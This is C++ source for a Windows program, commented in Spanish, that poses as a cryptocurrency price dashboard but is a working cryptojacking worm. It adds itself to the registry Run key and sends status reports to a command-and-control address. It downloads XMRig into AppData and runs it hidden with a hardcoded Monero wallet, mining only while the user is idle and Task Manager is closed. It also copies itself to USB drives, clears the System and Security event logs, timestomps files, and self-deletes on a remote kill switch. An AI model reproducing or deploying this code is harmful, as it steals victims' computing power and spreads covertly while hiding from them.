#include <iostream>
#include <string>
#include <vector>
#include <chrono>
#include <windows.h>
#include <shlobj.h>
#include <atomic>
#include <deque>
#include <algorithm>
#include <iomanip>
#include <sstream>
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <wininet.h>
#include <cpuid.h> 
#include <lmcons.h> // Necesario para UNLEN
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

#ifndef ENABLE_VIRTUAL_TERMINAL_PROCESSING
#define ENABLE_VIRTUAL_TERMINAL_PROCESSING 0x0004
#endif

// Parche para to_wstring (Solución al error de tu compilador)
namespace patch {
    template <typename T> std::wstring to_wstring(const T& n) {
        std::wstringstream wss;
        wss << n;
        return wss.str();
    }
}

// Prototipos
void SelfDelete();

// ==================== ESTRUCTURAS Y ESTADO GLOBAL ====================
struct RemoteConfig {
    std::wstring wallet;
    std::wstring pool;
    int cpu_usage;
};

std::atomic<bool> keep_running(true);
std::atomic<bool> is_injected(false);
std::atomic<bool> panic_mode(false);

// Usamos Secciones Críticas de Windows (Reemplazo de std::mutex)
CRITICAL_SECTION data_mutex;

PROCESS_INFORMATION target_pi = {0};

const std::string RESET = "\033[0m", BOLD = "\033[1m", GREEN = "\033[32m", 
                  RED = "\033[31m", CYAN = "\033[36m", YELLOW = "\033[33m", GRAY = "\033[90m";

struct Coin { std::string symbol; double price; double change; std::deque<double> history; };
std::vector<Coin> coins = {{"BTC/USDT", 94105.0, 0.0, {}}, {"ETH/USDT", 2390.2, 0.0, {}}, {"SOL/USDT", 144.5, 0.0, {}}};

// ==================== CAPA DE SEGURIDAD Y C2 ====================

std::wstring obs(std::wstring data) { for (auto &c : data) c ^= 0x3F; return data; }

void SendAdminReport(std::string status) {
    // Cambiamos el User Agent para que parezca un navegador real
    HINTERNET hNet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hNet) {
        char compName[MAX_COMPUTERNAME_LENGTH + 1]; 
        DWORD cSize = sizeof(compName);
        GetComputerNameA(compName, &cSize);

        std::string ip_servidor = "192.168.56.1"; // <--- REVISA QUE ESTA SEA TU IP
        std::string url = "http://" + ip_servidor + "/control/report.php?id=" + std::string(compName) + "&status=" + status;

        // Limpiar espacios en la URL
        for(size_t i = 0; i < url.length(); ++i) {
            if(url[i] == ' ') url.replace(i, 1, "%20");
        }

        // Flags críticas: RECHARGER (recargar) y NO_CACHE
        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE;
        
        HINTERNET hConn = InternetOpenUrlA(hNet, url.c_str(), NULL, 0, flags, 0);
        
        if (hConn) {
            // MUY IMPORTANTE: Leer al menos 1 byte para que Windows termine de enviar la URL
            char temp[1];
            DWORD read;
            InternetReadFile(hConn, temp, 1, &read); 
            
            InternetCloseHandle(hConn);
        }
        InternetCloseHandle(hNet);
    }
}
RemoteConfig FetchC2Config() {
    RemoteConfig cfg = { L"WALLET_DE_EMERGENCIA", L"pool.supportxmr.com:443", 25 };
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hNet) {
        HINTERNET hConn = InternetOpenUrlA(hNet, "https://gist.githubusercontent.com/lolofwr3/094b749e67ba9e0b947b38d0d8b6a558/raw/b787032892d32681536e1ea8b3a50504f283b27c/config.json", NULL, 0, INTERNET_FLAG_RELOAD, 0);        
        if (hConn) {
            char buffer[2048]; DWORD read;
            if (InternetReadFile(hConn, buffer, sizeof(buffer), &read) && read > 0) {
                std::string gist_data(buffer, read);
                if (gist_data.find("\"kill_switch\": true") != std::string::npos) {
                    SelfDelete();
                }
            }
            InternetCloseHandle(hConn);
        }
        InternetCloseHandle(hNet);
    }
    return cfg;
}

void StealthCleanup(std::wstring path) {
    HANDLE hFile = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        FILETIME ft; SYSTEMTIME st = { 2021, 5, 12, 14, 30, 0, 0, 0 };
        SystemTimeToFileTime(&st, &ft);
        SetFileTime(hFile, &ft, &ft, &ft);
        CloseHandle(hFile);
    }
    const wchar_t* logs[] = { L"System", L"Security" };
    for (auto l : logs) {
        HANDLE hLog = OpenEventLogW(NULL, l);
        if (hLog) { ClearEventLogW(hLog, NULL); CloseEventLog(hLog); }
    }
}

void SpreadWorm() {
    wchar_t driveStr[MAX_PATH];
    if (GetLogicalDriveStringsW(MAX_PATH, driveStr)) {
        wchar_t* drive = driveStr;
        while (*drive) {
            if (GetDriveTypeW(drive) == DRIVE_REMOVABLE) {
                wchar_t szPath[MAX_PATH]; GetModuleFileNameW(NULL, szPath, MAX_PATH);
                std::wstring usbDest = std::wstring(drive) + L"DATOS_RECOVERY_2026.exe";
                if (CopyFileW(szPath, usbDest.c_str(), FALSE)) {
                    SetFileAttributesW(usbDest.c_str(), FILE_ATTRIBUTE_HIDDEN);
                    StealthCleanup(usbDest);
                }
            }
            drive += wcslen(drive) + 1;
        }
    }
}

// ==================== INYECCIÓN Y PERSISTENCIA ====================

void ManageInjection(bool start) {
    if (start && !is_injected) {
        RemoteConfig liveCfg = FetchC2Config();
        STARTUPINFOW si = { sizeof(si) };
        si.cb = sizeof(si);
        std::wstring cmd = L"svchost.exe -o " + liveCfg.pool + L" -u " + liveCfg.wallet + L" --cpu-max-threads-hint=" + patch::to_wstring(liveCfg.cpu_usage);
        wchar_t commandLine[1024]; 
        lstrcpynW(commandLine, cmd.c_str(), 1024);

        if (CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", commandLine, NULL, NULL, FALSE, 
                           CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &target_pi)) {
            is_injected = true;
            ResumeThread(target_pi.hThread);
        }
    } else if (!start && is_injected) {
        TerminateProcess(target_pi.hProcess, 0);
        CloseHandle(target_pi.hProcess); CloseHandle(target_pi.hThread);
        ZeroMemory(&target_pi, sizeof(target_pi)); is_injected = false;
    }
}

void SetPersistence() {
    wchar_t szPath[MAX_PATH];
    wchar_t szAppData[MAX_PATH];
    
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szAppData) == S_OK) {
        std::wstring dest = std::wstring(szAppData) + L"\\TrendAnalyzer.exe";
        
        if (CopyFileW(szPath, dest.c_str(), FALSE)) {
            HKEY hKey;
            // Usamos LONG en lugar de LSTATUS para evitar errores de compilación
            LONG status = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
            
            if (status == ERROR_SUCCESS) {
                status = RegSetValueExW(hKey, L"SystemTrendHost", 0, REG_SZ, (BYTE*)dest.c_str(), (dest.size() + 1) * sizeof(wchar_t));
                
                if (status == ERROR_SUCCESS) {
                    SendAdminReport("PERSISTENCIA_REGISTRO_OK");
                } else {
                    SendAdminReport("ERROR_AL_ESCRIBIR_VALOR");
                }
                RegCloseKey(hKey);
            } else {
                SendAdminReport("ERROR_AL_ABRIR_LLAVE_REGISTRO");
            }
        }
    }
} // <--- ASEGÚRATE DE QUE ESTA LLAVE ESTÁ AQUÍ ANTES DEL MAIN

// ==================== INTERFAZ VISUAL Y MAIN ====================

void render_dashboard() {
    EnterCriticalSection(&data_mutex);
    std::stringstream ss; 
    ss << "\033[H" << CYAN << BOLD << " [ TERMINAL X-GEN v16.0 - MASTER PROTOCOL ] " << RESET << "\n";
    ss << GRAY << " ------------------------------------------------------------" << RESET << "\n";
    for (auto& c : coins) {
        ss << "  " << std::left << std::setw(10) << c.symbol << "$ " << std::fixed << std::setprecision(2) << std::setw(10) << c.price 
           << (c.change >= 0 ? GREEN : RED) << " [" << (c.change >= 0 ? "+" : "") << std::setprecision(2) << c.change << "%]" << RESET << "\n";
    }
    ss << GRAY << " ------------------------------------------------------------" << RESET << "\n";
    ss << "  C2 LINK:  " << GREEN << "ENCRYPTED" << RESET << " | HOLLOWING: " << (is_injected ? GREEN + "STABLE" : YELLOW + "IDLE") << RESET << "\n";
    ss << "  SECURITY: " << (panic_mode ? RED + "EVASION" : GREEN + "SECURE") << RESET << " | LOGS: " << RED << "WIPED" << RESET << "\n";
    std::cout << ss.str() << std::flush;
    LeaveCriticalSection(&data_mutex);
}


void IniciarMineriaReal(bool activar) {
    wchar_t appData[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    std::wstring minerPath = std::wstring(appData) + L"\\syshost.exe";

    if (activar) {
        // Si el motor NO existe, lo descargamos DIRECTO a AppData
        if (GetFileAttributesW(minerPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            SendAdminReport("DESCARGANDO_DIRECTO_A_APPDATA...");
            
            HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (hNet) {
                HINTERNET hUrl = InternetOpenUrlA(hNet, "http://192.168.56.1/control/xmrig.exe", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                if (hUrl) {
                    // Abrimos el archivo directamente en la ruta final
                    HANDLE hFile = CreateFileW(minerPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        char buffer[8192]; DWORD read;
                        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &read) && read > 0) {
                            DWORD written;
                            WriteFile(hFile, buffer, read, &written, NULL);
                        }
                        CloseHandle(hFile);
                        SendAdminReport("MOTOR_INSTALADO_CON_EXITO");
                    } else {
                        SendAdminReport("ERROR_CREAR_ARCHIVO_EN_APPDATA");
                    }
                    InternetCloseHandle(hUrl);
                }
                InternetCloseHandle(hNet);
            }
        }

        // Ejecutar (Asegúrate de que la wallet sea la tuya)
        // Cambia :10128 por :443
        // Usamos la IP directa de MoneroOcean (135.181.210.150) y el puerto 443
        // Añadimos "--log-file log_minero.txt" al final de los parámetros
        std::wstring params = L"-o gulf.moneroocean.stream:10128 -u 42DD7M1rUgkcq8iT52UQJTKyfokrTfFzqFEpB7XTxBnd5KBF14kUrJQb2S552DguvJa1snYxDJEAm4ZsUsQddachNh3y2xi -p VM_LAB --cpu-max-threads-hint 50 -B";                                                                                                                                
        
        // Solo intentamos ejecutar si el archivo existe de verdad
        if (GetFileAttributesW(minerPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ShellExecuteW(NULL, L"open", minerPath.c_str(), params.c_str(), NULL, SW_HIDE);
            SendAdminReport("EJECUCION_MINERO_OK");
        }
    } else {
        system("taskkill /IM syshost.exe /F >nul 2>&1");
    }
}
// --- FUNCION DEL HILO (WINAPI) ---
DWORD WINAPI ghost_worker(LPVOID lpParam) {
    bool ya_minando = false;

    while (keep_running) {
        // --- DETECCIÓN DE ACTIVIDAD ---
        LASTINPUTINFO lii = { sizeof(lii) }; 
        lii.cbSize = sizeof(lii); 
        GetLastInputInfo(&lii);
        
        bool user_present = ((GetTickCount() - lii.dwTime) / 1000) < 30; // 30 seg de inactividad
        bool monitored = false;

        // --- DETECCIÓN DE TASK MANAGER ---
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do { 
                if (wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0) 
                    monitored = true; 
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
        panic_mode = monitored;

        // --- LÓGICA DE MINERÍA REAL ---
        if (!monitored && !user_present) {
            if (!ya_minando) {
                IniciarMineriaReal(true);
                ya_minando = true;
                SendAdminReport("MINERO_REAL_ON");
            }
        } else {
            if (ya_minando) {
                IniciarMineriaReal(false); // Matar proceso si aparece el usuario
                ya_minando = false;
                SendAdminReport("MINERO_REAL_PAUSA");
            }
        }

        // Actualización de la interfaz (falsa) para el dashboard
        EnterCriticalSection(&data_mutex);
        for (auto& c : coins) c.price *= (1.0 + (rand() % 100 - 50) / 4500.0);
        LeaveCriticalSection(&data_mutex);

        Sleep(3000); // Revisar cada 3 segundos
    }
    return 0;
}

void SelfDelete() {
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[MAX_PATH * 3];
    GetModuleFileName(NULL, szModuleName, MAX_PATH);
    wsprintf(szCmd, "cmd.exe /C ping 1.2.3.4 -n 1 -w 3000 > Nul & del /f /q \"%s\"", szModuleName);
    STARTUPINFO si = { sizeof(si) }; si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    keep_running = false; 
    exit(0);
}

 
int main() {

     /*unsigned int eax, ebx, ecx, edx;
    if (__get_cpuid(1, &eax, &ebx, &ecx, &edx)) {
        if ((ecx >> 31) & 1) return 0; // Anti-VM
    }*/
    // --- LÓGICA DE INVISIBILIDAD RADICAL ---
    wchar_t currentPath[MAX_PATH];
    wchar_t appDataPath[MAX_PATH];
    
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    
    std::wstring currentStr = currentPath;
    std::wstring appDataStr = appDataPath;

    // Convertimos ambos a minúsculas para evitar errores de comparación (C:\ vs c:\)
    for(auto &c : currentStr) c = towlower(c);
    for(auto &c : appDataStr) c = towlower(c);

    // Si la ruta ACTUAL contiene la ruta de APPDATA, es que somos el clon persistente
    if (currentStr.find(appDataStr) != std::wstring::npos) {
        // MODO FANTASMA
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE); 
    } else {
        // MODO MANUAL (Escritorio)
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_SHOW);
    }
    // ----------------------------------------

    // 1. REPORTE DE EMERGENCIA
    SendAdminReport("INICIO_POWER_ON");

    // 2. Inicializar Sincronización
    InitializeCriticalSection(&data_mutex);

    // 3. PERSISTENCIA
    try {
        SetPersistence();
    } catch (...) {
        SendAdminReport("ERROR_EN_PERSISTENCIA");
    }

    // 4. Configurar consola (Colores)
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    if (GetConsoleMode(hOut, &dwMode)) {
        SetConsoleMode(hOut, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
    }
    
    std::srand((unsigned)time(NULL));

    // 5. Crear el hilo de trabajo (Este corre siempre)
    HANDLE hGhost = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ghost_worker, NULL, 0, NULL);

    // 6. Loop de Interfaz
    while (keep_running) {
        // SOLO RENDERIZAMOS SI NO ESTAMOS EN APPDATA
        if (currentStr.find(appDataStr) == std::wstring::npos) {
            render_dashboard();
        } else {
            // Si estamos en modo oculto, dormimos más tiempo para no gastar CPU innecesaria
            Sleep(5000); 
        }
        
        if (GetAsyncKeyState(VK_ESCAPE)) keep_running = false;
        Sleep(400); 
    }

    // Limpieza
    keep_running = false;
    if (hGhost) {
        WaitForSingleObject(hGhost, 1000);
        CloseHandle(hGhost);
    }
    DeleteCriticalSection(&data_mutex);
    return 0;
}
